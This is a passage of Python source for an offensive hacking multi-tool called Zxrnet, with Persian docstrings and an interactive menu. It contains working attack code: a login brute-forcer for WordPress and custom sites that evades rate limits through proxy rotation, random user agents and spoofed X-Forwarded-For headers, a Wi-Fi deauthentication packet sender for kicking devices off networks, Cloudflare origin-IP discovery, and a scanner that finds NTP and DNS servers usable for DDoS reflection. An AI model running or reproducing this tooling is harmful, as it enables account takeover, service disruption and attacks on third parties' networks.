            vuln_url, vuln_type, payload = self.vuln_queue.get()
            table.add_row([vuln_url, vuln_type, payload])
            found_vulns += 1
            with open(result_file, "a") as f:
                f.write(f"{vuln_url} - {vuln_type}: {payload}\n")

        if found_vulns > 0:
            print(colored(f"[!] Found {found_vulns} vulnerabilities!", "red", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[+] No vulnerabilities found!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned vulnerabilities on {url}. Found {found_vulns} vulnerabilities")

    def fingerprint_web(self, url):
        """فینگرپرینتینگ وب"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Fingerprinting {url}...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Technology", "Version"])
        headers_to_check = {
            "Server": None,
            "X-Powered-By": None,
            "X-Generator": None
        }

        try:
            if url in self.cache:
                response = self.cache[url]
            else:
                response = requests.get(url, timeout=5)
                self.cache[url] = response
            headers = response.headers
            content = response.text.lower()

            for header in headers_to_check:
                if header in headers:
                    table.add_row([header, headers[header]])

            if "wordpress" in content:
                version = re.search(r'wordpress\s*(\d+\.\d+\.\d+)?', content)
                table.add_row(["WordPress", version.group(1) if version else "Unknown"])
            if "drupal" in content:
                version = re.search(r'drupal\s*(\d+)?', content)
                table.add_row(["Drupal", version.group(1) if version else "Unknown"])
            if "joomla" in content:
                version = re.search(r'joomla\s*(\d+\.\d+\.\d+)?', content)
                table.add_row(["Joomla", version.group(1) if version else "Unknown"])

            print(table)
            self.generate_report(f"Fingerprinted {url}. Detected technologies: {len(table._rows)}")
        except Exception as e:
            print(colored(f"[-] Error fingerprinting {url}: {e}", "red", attrs=["bold"]))
            log_message(f"Error fingerprinting {url}: {e}")

    def check_related_domain(self, domain):
        """بررسی دامنه‌های مرتبط با استفاده از Reverse IP Lookup"""
        try:
            answers = dns.resolver.resolve(domain, 'A')
            ip = str(answers[0])
            if ip in self.cache:
                domains = self.cache[ip]
            else:
                response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=5)
                domains = response.text.splitlines()
                self.cache[ip] = domains
            for related_domain in domains:
                if related_domain != domain:
                    self.related_domain_queue.put((related_domain, ip))
        except Exception as e:
            log_message(f"Error checking related domains for {domain}: {e}")

    def scan_related_domains(self, domain, threads=None):
        """اسکن دامنه‌های مرتبط"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning related domains for {domain} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Related Domain", "IP Address"])
        self.check_related_domain(domain)

        with tqdm(total=1, desc="Scanning Related Domains", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.submit(self.check_related_domain, domain)
                pbar.update(1)

        found_domains = 0
        result_file = f"related_domains_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.related_domain_queue.empty():
            related_domain, ip = self.related_domain_queue.get()
            table.add_row([related_domain, ip])
            found_domains += 1
            with open(result_file, "a") as f:
                f.write(f"{related_domain}: {ip}\n")

        if found_domains > 0:
            print(colored(f"[+] Found {found_domains} related domains!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No related domains found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned related domains for {domain}. Found {found_domains} domains")

    def simple_pentest(self, url):
        """تست نفوذ ساده با بررسی هدرهای امنیتی"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Performing simple pentest on {url}...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Check", "Status", "Details"])
        try:
            if url in self.cache:
                response = self.cache[url]
            else:
                response = requests.get(url, timeout=5)
                self.cache[url] = response
            headers = response.headers

            if "X-Frame-Options" not in headers:
                table.add_row(["X-Frame-Options", colored("Missing", "red", attrs=["bold"]), "Vulnerable to Clickjacking"])
            else:
                table.add_row(["X-Frame-Options", colored("Present", "green", attrs=["bold"]), headers["X-Frame-Options"]])

            if "Content-Security-Policy" not in headers:
                table.add_row(["CSP", colored("Missing", "red", attrs=["bold"]), "No Content Security Policy"])
            else:
                table.add_row(["CSP", colored("Present", "green", attrs=["bold"]), "Policy exists"])

            if "X-Content-Type-Options" not in headers or headers["X-Content-Type-Options"] != "nosniff":
                table.add_row(["X-Content-Type-Options", colored("Missing/Incorrect", "red", attrs=["bold"]), "MIME sniffing possible"])
            else:
                table.add_row(["X-Content-Type-Options", colored("Present", "green", attrs=["bold"]), "nosniff"])

            print(table)
            self.generate_report(f"Performed simple pentest on {url}. Checked {len(table._rows)} security headers")
        except Exception as e:
            print(colored(f"[-] Error during pentest: {e}", "red", attrs=["bold"]))
            log_message(f"Error during pentest on {url}: {e}")

    def scan_lan_device(self, ip):
        """اسکن دستگاه‌های شبکه محلی"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 80))
            if result == 0:
                self.lan_queue.put(ip)
            sock.close()
        except Exception:
            pass

    def scan_lan(self, threads=None):
        """اسکن شبکه محلی"""
        self.banner()
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning local network with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["IP Address"])
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            base_ip = ".".join(local_ip.split(".")[:-1]) + "."
        except Exception as e:
            print(colored(f"[-] Error getting local IP: {e}", "red", attrs=["bold"]))
            return

        ip_list = [base_ip + str(i) for i in range(1, 255)]
        total_ips = len(ip_list)

        with tqdm(total=total_ips, desc="Scanning LAN", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for ip in ip_list:
                    executor.submit(self.scan_lan_device, ip)
                    pbar.update(1)

        found_devices = 0
        result_file = f"lan_devices_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.lan_queue.empty():
            ip = self.lan_queue.get()
            table.add_row([ip])
            found_devices += 1
            with open(result_file, "a") as f:
                f.write(f"{ip}\n")

        if found_devices > 0:
            print(colored(f"[+] Found {found_devices} devices in LAN!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No devices found in LAN!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned LAN. Found {found_devices} devices")

    def scan_wifi(self, interface=None, threads=None):
        """اسکن شبکه وای‌فای و مدیریت دستگاه‌ها"""
        self.banner()
        if not interface:
            interface = self.get_user_input("Enter Wi-Fi interface (e.g., wlan0)", None)
            if not interface:
                print(colored("[-] Interface required!", "red", attrs=["bold"]))
                return

        threads = threads or self.max_threads
        print(colored(f"[*] Scanning Wi-Fi networks on {interface} with {threads} threads...", "yellow", attrs=["bold"]))

        devices = []
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                    ssid = pkt.info.decode('utf-8', errors='ignore')
                    bssid = pkt.addr2
                    devices.append({"SSID": ssid, "BSSID": bssid, "IP": None})
                elif pkt.haslayer(Dot11ProbeResp) or pkt.haslayer(Dot11ProbeReq):
                    mac = pkt.addr2
                    ip = self.get_ip_from_mac(mac)
                    devices.append({"SSID": None, "BSSID": mac, "IP": ip})

        print(colored("[*] Sniffing Wi-Fi packets... Press Ctrl+C to stop", "yellow", attrs=["bold"]))
        try:
            sniff(iface=interface, prn=packet_handler, timeout=30)
        except Exception as e:
            print(colored(f"[-] Error sniffing Wi-Fi: {e}", "red", attrs=["bold"]))
            log_message(f"Error sniffing Wi-Fi: {e}")

        unique_devices = {d["BSSID"]: d for d in devices}.values()
        table = PrettyTable(["SSID", "BSSID", "IP"])
        for device in unique_devices:
            table.add_row([device["SSID"] or "N/A", device["BSSID"], device["IP"] or "N/A"])
            self.wifi_queue.put(device)

        print(colored(f"[+] Found {len(unique_devices)} devices/networks!", "green", attrs=["bold"]))
        print(table)

        while True:
            print(colored("\nWi-Fi Management Options:", "cyan", attrs=["bold"]))
            print(colored("1. Kick Device (Deauth)", "cyan", attrs=["bold"]))
            print(colored("2. Ban Device (Block MAC)", "cyan", attrs=["bold"]))
            print(colored("3. Exit Wi-Fi Management", "cyan", attrs=["bold"]))
            choice = self.get_user_input("Select an option", None)

            if choice == "1":
                target_mac = self.get_user_input("Enter target BSSID/MAC to kick", None)
                self.deauth_device(interface, target_mac)
            elif choice == "2":
                target_mac = self.get_user_input("Enter target BSSID/MAC to ban", None)
                self.ban_device(interface, target_mac)
            elif choice == "3":
                break
            else:
                print(colored("[-] Invalid option!", "red", attrs=["bold"]))  # Properly indented

        self.generate_report(f"Scanned Wi-Fi on {interface}. Found {len(unique_devices)} devices/networks")

    def get_ip_from_mac(self, mac):
        """دریافت IP از MAC با ARP"""
        try:
            arp_request = ARP(pdst="192.168.1.1/24")
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            for sent, received in answered_list:
                if received.hwsrc == mac:
                    return received.psrc
            return None
        except Exception:
            return None

    def deauth_device(self, interface, target_mac, count=10):
        """ارسال پکت‌های Deauthentication برای قطع اتصال"""
        self.banner()
        print(colored(f"[*] Sending {count} deauth packets to {target_mac}...", "red", attrs=["bold"]))
        try:
            pkt = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth()
            sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)
            print(colored(f"[+] Deauth packets sent to {target_mac}", "green", attrs=["bold"]))
            self.generate_report(f"Sent {count} deauth packets to {target_mac}")
        except Exception as e:
            print(colored(f"[-] Error sending deauth: {e}", "red", attrs=["bold"]))
            log_message(f"Error sending deauth to {target_mac}: {e}")

    def ban_device(self, interface, target_mac):
        """مسدود کردن دستگاه با فیلتر MAC (نیاز به دسترسی روتر)"""
        self.banner()
        print(colored(f"[*] Attempting to ban {target_mac} (requires router access)...", "red", attrs=["bold"]))
        try:
            print(colored("[!] This feature requires manual router configuration or root access", "yellow", attrs=["bold"]))
            print(colored(f"[+] Command example: iptables -A INPUT -m mac --mac-source {target_mac} -j DROP", "green", attrs=["bold"]))
            self.generate_report(f"Attempted to ban {target_mac}")
        except Exception as e:
            print(colored(f"[-] Error banning device: {e}", "red", attrs=["bold"]))
            log_message(f"Error banning {target_mac}: {e}")

    def resolve_cloudflare(self, domain, threads=None):
        """پیدا کردن IP واقعی پشت Cloudflare"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        if not os.path.exists(self.subdomain_file):
            print(colored("[-] Subdomain wordlist not found! Downloading...", "yellow", attrs=["bold"]))
            self.download_subdomain_list()

        try:
            with open(self.subdomain_file, "r") as f:
                subdomains = [line.strip() for line in f if line.strip()][:500]
        except Exception as e:
            print(colored(f"[-] Error reading subdomain file: {e}", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Resolving Cloudflare real IP for {domain} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Subdomain", "Real IP"])
        found_ips = set()

        def test_subdomain(subdomain):
            full_domain = f"{subdomain}.{domain}"
            try:
                answers = dns.resolver.resolve(full_domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    if sock.connect_ex((ip, 80)) == 0 or sock.connect_ex((ip, 443)) == 0:
                        if "cloudflare" not in requests.get(f"http://{full_domain}", timeout=5).text.lower():
                            found_ips.add(ip)
                            self.subdomain_queue.put((full_domain, ip))
                    sock.close()
            except Exception:
                pass

        with tqdm(total=len(subdomains), desc="Resolving Cloudflare", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for subdomain in subdomains:
                    executor.submit(test_subdomain, subdomain)
                    pbar.update(1)

        while not self.subdomain_queue.empty():
            subdomain, ip = self.subdomain_queue.get()
            table.add_row([subdomain, ip])

        if found_ips:
            print(colored(f"[+] Found {len(found_ips)} real IPs behind Cloudflare!", "green", attrs=["bold"]))
            print(table)
            self.generate_report(f"Resolved Cloudflare for {domain}. Found {len(found_ips)} real IPs")
        else:
            print(colored("[!] Could not resolve real IP behind Cloudflare!", "yellow", attrs=["bold"]))
            self.generate_report(f"Failed to resolve Cloudflare for {domain}")

    def brute_force_login(self, url, username, target_type="custom", wordlist_file=None, threads=None):
        """بروت فورس پیشرفته با بای‌پس محدودیت‌ها"""
        self.banner()
        threads = threads or self.max_threads

        if target_type == "wordpress":
            if not os.path.exists(self.wordpress_wordlist_file):
                print(colored("[-] WordPress wordlist not found! Downloading from 10 sources...", "yellow", attrs=["bold"]))
                if not self.download_wordpress_wordlists():
                    fallback = self.get_user_input("Download failed! Enter a custom wordlist path or press Enter to exit", None)
                    if not fallback or not os.path.exists(fallback):
                        print(colored("[-] Exiting brute force due to missing wordlist...", "red", attrs=["bold"]))
                        return
                    wordlist_file = fallback
                else:
                    wordlist_file = self.wordpress_wordlist_file
            else:
                wordlist_file = self.wordpress_wordlist_file
            print(colored(f"[*] Using massive WordPress-specific wordlist: {wordlist_file}", "cyan", attrs=["bold"]))
        else:
            if not wordlist_file or not os.path.exists(wordlist_file):
                print(colored("[-] Wordlist file not found!", "red", attrs=["bold"]))
                return

        try:
            with open(wordlist_file, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(colored(f"[+] Loaded {len(passwords)} passwords for brute force", "green", attrs=["bold"]))
        except Exception as e:
            print(colored(f"[-] Error reading wordlist file: {e}", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Starting advanced brute force on {url} with username {username} and {threads} threads...", "yellow", attrs=["bold"]))
        total_attempts = len(passwords)
        found = False
        failed_attempts = 0
        max_fails = 50

        headers_base = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

        def try_login(password):
            nonlocal found, failed_attempts
            if found:
                return

            session = requests.Session()
            attempt_count = 0
            max_attempts_per_proxy = 10

            while not found and attempt_count < max_attempts_per_proxy:
                try:
                    headers = headers_base.copy()
                    headers["User-Agent"] = random.choice(USER_AGENTS)
                    headers["Referer"] = random.choice(["https://google.com", "https://facebook.com", url])
                    headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

                    proxy = random.choice([p[0] for p in self.working_proxies["http"]]) if self.working_proxies["http"] else None
                    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

                    time.sleep(random.uniform(0.1, 1.0))

                    if target_type == "wordpress":
                        data = {
                            "log": username,
                            "pwd": password,
                            "wp-submit": "Log In",
                            "redirect_to": f"{url}/wp-admin/",
                            "testcookie": "1"
                        }
                    else:
                        data = {"username": username, "password": password}

                    response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=5, allow_redirects=True)

                    if target_type == "wordpress":
                        if "wp-admin" in response.url or "dashboard" in response.text.lower():
                            found = True
                            self.vuln_queue.put((username, password))
                            return
                    else:
                        if response.status_code == 200 and "login" not in response.text.lower():
                            found = True
                            self.vuln_queue.put((username, password))
                            return

                    if response.status_code in [429, 403] or "cloudflare" in response.text.lower():
                        failed_attempts += 1
                        if failed_attempts >= max_fails:
                            print(colored("[!] Rate limit detected, switching proxy...", "yellow", attrs=["bold"]))
                            failed_attempts = 0
                            break
                        time.sleep(random.uniform(2, 5))
                    else:
                        attempt_count += 1

                except Exception as e:
                    log_message(f"Error trying {password}: {e}")
                    attempt_count += 1
                    time.sleep(random.uniform(1, 3))

        with tqdm(total=total_attempts, desc="Brute Forcing", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for password in passwords:
                    if not found:
                        executor.submit(try_login, password)
                    pbar.update(1)

        if found:
            username, password = self.vuln_queue.get()
            print(colored(f"[!] Login cracked! Username: {username} | Password: {password}", "red", attrs=["bold"]))
            self.generate_report(f"Brute forced login on {url}. Credentials: {username}:{password}")
        else:
            print(colored("[+] No valid credentials found!", "green", attrs=["bold"]))
            self.generate_report(f"Brute force on {url} failed")

    def scan_api_keys(self, url, threads=None):
        """اسکن نشت کلیدهای API"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning {url} for API key leaks with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["API Type", "Key"])

        def check_content(content):
            for api_type, pattern in API_KEY_PATTERNS.items():
                matches = re.findall(pattern, content)
                for match in matches:
                    self.api_key_queue.put((api_type, match))

        try:
            if url in self.cache:
                response = self.cache[url]
            else:
                response = requests.get(url, timeout=5)
                self.cache[url] = response
            check_content(response.text)

            common_files = [f"{url}/robots.txt", f"{url}/sitemap.xml"] + [f"{url}/{i}.js" for i in range(1, 5)]
            with tqdm(total=len(common_files), desc="Scanning Files", colour="green") as pbar:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    for file_url in common_files:
                        try:
                            if file_url in self.cache:
                                resp = self.cache[file_url]
                            else:
                                resp = requests.get(file_url, timeout=5)
                                self.cache[file_url] = resp
                            check_content(resp.text)
                        except Exception:
                            pass
                        pbar.update(1)

        except Exception as e:
            log_message(f"Error scanning API keys on {url}: {e}")

        found_keys = 0
        result_file = f"api_keys_{parsed_url.netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.api_key_queue.empty():
            api_type, key = self.api_key_queue.get()
            table.add_row([api_type, key])
            found_keys += 1
            with open(result_file, "a") as f:
                f.write(f"{api_type}: {key}\n")

        if found_keys > 0:
            print(colored(f"[!] Found {found_keys} API keys!", "red", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[+] No API keys found!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned API keys on {url}. Found {found_keys} keys")

    def check_reflection(self, ip, port):
        """بررسی سرورهای بازتاب‌دهنده"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            if port == 123:  # NTP
                sock.sendto(b"\x1b" + 47 * b"\0", (ip, port))
            elif port == 53:  # DNS
                sock.sendto(b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01", (ip, port))
            data, _ = sock.recvfrom(1024)
            if len(data) > 100:
                self.reflection_queue.put((ip, port))
            sock.close()
        except Exception:
            pass

    def scan_reflection(self, ip_range, threads=None):
        """اسکن سرورهای بازتاب‌دهنده برای DDoS"""
        self.banner()
        if not "-" in ip_range:
            print(colored("[-] Invalid IP range! Use format: 192.168.1.1-192.168.1.255", "red", attrs=["bold"]))
            return
        start_ip, end_ip = ip_range.split("-")
        if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
            print(colored("[-] Invalid IP addresses!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning {ip_range} for DDoS reflection servers with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["IP", "Port"])

        start = list(map(int, start_ip.split(".")))
        end = list(map(int, end_ip.split(".")))
        ip_list = []
        for i in range(start[0], end[0] + 1):
            for j in range(start[1] if i == start[0] else 0, end[1] if i == end[0] else 256):
                for k in range(start[2] if j == start[1] else 0, end[2] if j == end[1] else 256):
                    for l in range(start[3] if k == start[2] else 0, end[3] if k == end[2] else 256):
                        ip_list.append(f"{i}.{j}.{k}.{l}")

        ports = [123, 53]
        total_checks = len(ip_list) * len(ports)

        with tqdm(total=total_checks, desc="Scanning Reflection", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for ip in ip_list:
                    for port in ports:
                        executor.submit(self.check_reflection, ip, port)
                        pbar.update(1)

        found_servers = 0
        result_file = f"reflection_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.reflection_queue.empty():
            ip, port = self.reflection_queue.get()
            table.add_row([ip, port])
            found_servers += 1
            with open(result_file, "a") as f:
                f.write(f"{ip}:{port}\n")

        if found_servers > 0:
            print(colored(f"[+] Found {found_servers} reflection servers!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No reflection servers found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned {ip_range} for reflection servers. Found {found_servers} servers")

    def generate_report(self, message):
        """تولید گزارش"""
        try:
            with open("zxrnet_report.txt", "a") as f:
                f.write(f"[{datetime.now()}] {message}\n")
            log_message(message)
        except Exception as e:
            print(colored(f"[-] Error writing report: {e}", "red", attrs=["bold"]))
            log_message(f"Error writing report: {e}")

    def open_exit_link(self):
        """باز کردن لینک خروج"""
        import platform  # Re-import to avoid shadowing
        try:
            webbrowser.open(self.exit_link)
        except Exception:
            if platform.system() == "Windows":
                os.system(f"start {self.exit_link}")
            elif platform.system() == "Linux":
                os.system(f"xdg-open {self.exit_link} || termux-open-url {self.exit_link}")
            else:
                os.system(f"termux-open-url {self.exit_link} || xdg-open {self.exit_link}")

    def display_menu(self):
        """نمایش منوی اصلی"""
        self.banner()
        options = [
            "1. Generate Password List",
            "2. Fetch Proxies",
            "3. Test Proxies",
            "4. Scan Ports",
            "5. Scan Backdoors",
            "6. Scan Virus",
            "7. Advanced Layer 7 Stress",
            "8. Enumerate Subdomains",
            "9. Scan Web Vulnerabilities",
            "10. Web Fingerprinting",
            "11. Scan Related Domains",
            "12. Simple Pentest",
            "13. Scan LAN",
            "14. Scan Wi-Fi",
            "15. Resolve Cloudflare",
            "16. Brute Force Login",
            "17. Scan API Key Leaks",
            "18. Scan DDoS Reflection",
            "19. Exit"
        ]
        print(colored("Available Options:", "cyan", attrs=["bold"]))
        print("\n".join(colored(opt, "cyan", attrs=["bold"]) for opt in options))

    def get_user_input(self, prompt, default=None):
        """دریافت ورودی کاربر"""
        try:
            value = input(colored(f"{prompt} [{'default' if default else 'required'}]: ", "yellow", attrs=["bold"]))
            return value if value else default
        except Exception as e:
            print(colored(f"[-] Error getting input: {e}", "red", attrs=["bold"]))
            return default

    def run(self):
        """اجرای حلقه اصلی"""
        while True:
            self.display_menu()
            choice = self.get_user_input("Select an option", None)

            try:
                if choice == "1":
                    length = int(self.get_user_input("Password length", "12"))
                    count = int(self.get_user_input("Number of passwords", "5000"))
                    custom_words = self.get_user_input("Custom words (space-separated)", None)
                    self.generate_password_list(length, count, custom_words)

                elif choice == "2":
                    self.fetch_proxies()

                elif choice == "3":
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.test_all_proxies(threads)

                elif choice == "4":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    port_range_input = self.get_user_input("Port range (start-end)", "1-1000")
                    port_range = self.validate_port_range(port_range_input)
                    if not port_range:
                        continue
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_ports(target, port_range, threads)

                elif choice == "5":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_backdoors(target, threads)

                elif choice == "6":
                    file_path = self.get_user_input("File path to scan (leave blank for system scan)", None)
                    self.scan_virus(file_path)

                elif choice == "7":
                    target = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    duration = int(self.get_user_input("Duration (seconds)", "60"))
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    use_proxies = self.get_user_input("Use proxies? (y/n)", "y").lower() == "y"
                    self.layer7_stress(target, duration, threads, use_proxies)

                elif choice == "8":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    limit = int(self.get_user_input("Subdomain limit", "10000"))
                    self.enumerate_subdomains(domain, threads, limit)

                elif choice == "9":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_vulnerabilities(url, threads)

                elif choice == "10":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    self.fingerprint_web(url)

                elif choice == "11":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_related_domains(domain, threads)

                elif choice == "12":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    self.simple_pentest(url)

                elif choice == "13":
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_lan(threads)

                elif choice == "14":
                    interface = self.get_user_input("Wi-Fi interface (e.g., wlan0)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_wifi(interface, threads)

                elif choice == "15":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.resolve_cloudflare(domain, threads)

                elif choice == "16":
                    url = self.get_user_input("Target URL (e.g., http://example.com/wp-login.php)", None)
                    username = self.get_user_input("Username", None)
                    target_type = self.get_user_input("Target type (wordpress/custom)", "custom")
                    if target_type not in ["wordpress", "custom"]:
                        print(colored("[-] Invalid target type! Use 'wordpress' or 'custom'", "red", attrs=["bold"]))
                        continue
                    wordlist_file = self.get_user_input("Wordlist file path (leave blank for WordPress default)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.brute_force_login(url, username, target_type, wordlist_file, threads)

                elif choice == "17":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_api_keys(url, threads)

                elif choice == "18":
                    ip_range = self.get_user_input("IP range (e.g., 192.168.1.1-192.168.1.255)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_reflection(ip_range, threads)

                elif choice == "19":
                    print(colored("[+] Exiting Zxrnet...", "green", attrs=["bold"]))
                    self.save_config()
                    self.open_exit_link()
                    sys.exit(0)

                else:
                    print(colored("[-] Invalid option! Please select a number between 1 and 19.", "red", attrs=["bold"]))

            except ValueError as e:
                print(colored(f"[-] Invalid input: {e}", "red", attrs=["bold"]))
            except Exception as e:
                print(colored(f"[-] An error occurred: {e}", "red", attrs=["bold"]))
                log_message(f"Error in run loop: {e}")

if __name__ == "__main__":
    zxrnet = Zxrnet()
    zxrnet.run()